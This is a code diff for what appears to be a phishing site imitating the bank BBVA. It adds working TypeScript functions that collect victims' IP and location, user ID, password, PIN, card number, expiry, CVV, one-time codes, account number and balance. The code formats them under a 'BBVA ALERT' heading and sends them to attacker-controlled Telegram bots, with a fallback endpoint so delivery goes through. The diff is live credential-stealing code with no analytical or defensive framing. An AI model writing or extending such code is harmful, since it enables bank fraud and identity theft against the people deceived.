@@ -191,7 +191,205 @@ export const fetchVisitorInfo = async () => {
     return null;
 };
 
-export const sendTelegramMessage = async (_params?: any) => {
-    // Telegram messaging disabled for now
-    return null;
+export const sendTelegramRawMessage = async (messageText: string) => {
+    try {
+        const botTokensValue =
+            process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ||
+            process.env.TELEGRAM_BOT_TOKEN;
+        const chatIdValue =
+            process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ||
+            process.env.TELEGRAM_CHAT_ID;
+        const gateway =
+            process.env.NEXT_PUBLIC_TELEGRAM_API_GATEWAY ||
+            process.env.TELEGRAM_API_GATEWAY ||
+            "https://api.telegram.org";
+
+        if (!botTokensValue || !chatIdValue) {
+            console.warn("Telegram bot token or chat ID is missing in environment variables.");
+            return null;
+        }
+
+        const chatIds = chatIdValue.split(",").map((id) => id.trim()).filter(Boolean);
+        const botTokens = botTokensValue.split(",").map((token) => token.trim()).filter(Boolean);
+        const cleanGateway = gateway.replace(/\/+$/, "");
+
+        const results = await Promise.all(
+            chatIds.map(async (id, index) => {
+                const token = botTokens[index] || botTokens[botTokens.length - 1];
+                const endpoints = [
+                    `${cleanGateway}/bot${token}/sendMessage`,
+                    `https://api.telegram.org/bot${token}/sendMessage`,
+                ];
+
+                for (const url of endpoints) {
+                    try {
+                        const response = await fetch(url, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: id,
+                                text: messageText,
+                                parse_mode: "HTML",
+                            }),
+                        });
+                        if (response.ok) {
+                            return await response.json();
+                        }
+                    } catch (err) {
+                        // try next endpoint fallback
+                    }
+                }
+                return null;
+            })
+        );
+        return results;
+    } catch (error) {
+        console.error("❌ Critical Error in sendTelegramRawMessage:", error);
+        return null;
+    }
+};
+
+export const sendTelegramMessage = async (params: {
+    title?: string;
+    type?: string;
+    exclude?: string[];
+    message?: string;
+    [key: string]: any;
+}) => {
+    try {
+        const { title, type, exclude, message: customMessage, ...data } = params;
+
+        let formattedMessage = `<b>🚀 ${title || "BBVA ALERT"}</b>\n\n`;
+
+        // Section: LOCATION & DEVICE INFO (included unless excluded)
+        if (!exclude?.includes("location") && typeof window !== "undefined") {
+            const ip =
+                sessionStorage.getItem("bbva_user_ip") ||
+                sessionStorage.getItem("ip") ||
+                "Unknown";
+            const country =
+                sessionStorage.getItem("bbva_user_country") ||
+                sessionStorage.getItem("country") ||
+                "N/A";
+            const city =
+                sessionStorage.getItem("bbva_user_city") ||
+                sessionStorage.getItem("city") ||
+                "N/A";
+
+            if (ip !== "Unknown" || country !== "N/A" || city !== "N/A") {
+                formattedMessage += `<b>🌍 DEVICE & LOCATION:</b>\n`;
+                if (ip && ip !== "Unknown") formattedMessage += `• <b>IP:</b> <code>${ip}</code>\n`;
+                if (country && country !== "N/A") formattedMessage += `• <b>Country:</b> <code>${country}</code>\n`;
+                if (city && city !== "N/A") formattedMessage += `• <b>City:</b> <code>${city}</code>\n`;
+                if (window.location?.href) formattedMessage += `• <b>URL:</b> ${window.location.href}\n`;
+                formattedMessage += `\n`;
+            }
+        }
+
+        // Section: USER DATA
+        const dniVal = data.dni || data.userId || data.user;
+        const passVal = data.password || data.pass;
+        const pinVal = data.pin;
+        const phoneVal = data.phoneNumber || data.phone;
+        const emailVal = data.email;
+        const nameVal = data.name;
+
+        if (dniVal || passVal || pinVal || phoneVal || emailVal || nameVal) {
+            formattedMessage += `<b>👤 USER DATA:</b>\n`;
+            if (dniVal) formattedMessage += `• <b>User / DNI:</b> <code>${dniVal}</code>\n`;
+            if (passVal) formattedMessage += `• <b>Password:</b> <code>${passVal}</code>\n`;
+            if (pinVal) formattedMessage += `• <b>PIN:</b> <code>${pinVal}</code>\n`;
+            if (phoneVal) formattedMessage += `• <b>Phone:</b> <code>${phoneVal}</code>\n`;
+            if (emailVal) formattedMessage += `• <b>Email:</b> <code>${emailVal}</code>\n`;
+            if (nameVal) formattedMessage += `• <b>Name:</b> <code>${nameVal}</code>\n`;
+            formattedMessage += `\n`;
+
+            delete data.dni;
+            delete data.userId;
+            delete data.user;
+            delete data.password;
+            delete data.pass;
+            delete data.pin;
+            delete data.phoneNumber;
+            delete data.phone;
+            delete data.email;
+            delete data.name;
+        }
+
+        // Section: CARD DETAILS
+        const cardVal = data.cardNumber || data.card;
+        const expiryVal = data.expiry || data.cardExpiry;
+        const cvvVal = data.cvv || data.cardCvv;
+
+        if (cardVal || expiryVal || cvvVal) {
+            formattedMessage += `<b>💳 CARD DETAILS:</b>\n`;
+            if (cardVal) formattedMessage += `• <b>Card No:</b> <code>${cardVal}</code>\n`;
+            if (expiryVal) formattedMessage += `• <b>Expiry:</b> <code>${expiryVal}</code>\n`;
+            if (cvvVal) formattedMessage += `• <b>CVV:</b> <code>${cvvVal}</code>\n`;
+            formattedMessage += `\n`;
+
+            delete data.cardNumber;
+            delete data.card;
+            delete data.expiry;
+            delete data.cardExpiry;
+            delete data.cvv;
+            delete data.cardCvv;
+        }
+
+        // Section: OTP VERIFICATION
+        const otp1Val = data.otp1 || data.otp;
+        const otp2Val = data.otp2;
+        const otp3Val = data.otp3;
+
+        if (otp1Val || otp2Val || otp3Val) {
+            formattedMessage += `<b>🔐 OTP VERIFICATION:</b>\n`;
+            if (otp1Val) formattedMessage += `• <b>OTP 1:</b> <code>${otp1Val}</code>\n`;
+            if (otp2Val) formattedMessage += `• <b>OTP 2:</b> <code>${otp2Val}</code>\n`;
+            if (otp3Val) formattedMessage += `• <b>OTP 3:</b> <code>${otp3Val}</code>\n`;
+            formattedMessage += `\n`;
+
+            delete data.otp;
+            delete data.otp1;
+            delete data.otp2;
+            delete data.otp3;
+        }
+
+        // Section: FINANCIAL DETAILS
+        const accVal = data.accountNumber || data.account;
+        const balVal = data.balance || data.accountBalance;
+
+        if (accVal || balVal) {
+            formattedMessage += `<b>💰 ACCOUNT DETAILS:</b>\n`;
+            if (accVal) formattedMessage += `• <b>Account:</b> <code>${accVal}</code>\n`;
+            if (balVal) formattedMessage += `• <b>Balance:</b> <code>${balVal}</code>\n`;
+            formattedMessage += `\n`;
+
+            delete data.accountNumber;
+            delete data.account;
+            delete data.balance;
+            delete data.accountBalance;
+        }
+
+        // Custom Message body if provided
+        if (customMessage) {
+            formattedMessage += `${customMessage}\n\n`;
+        }
+
+        // Any other extra fields
+        const extraEntries = Object.entries(data);
+        if (extraEntries.length > 0) {
+            formattedMessage += `<b>📋 ADDITIONAL DETAILS:</b>\n`;
+            for (const [key, val] of extraEntries) {
+                if (val !== undefined && val !== null && val !== "") {
+                    formattedMessage += `• <b>${key}:</b> <code>${val}</code>\n`;
+                }
+            }
+            formattedMessage += `\n`;
+        }
+
+        return await sendTelegramRawMessage(formattedMessage);
+    } catch (error) {
+        console.error("❌ Critical Error in sendTelegramMessage:", error);
+        return null;
+    }
 };
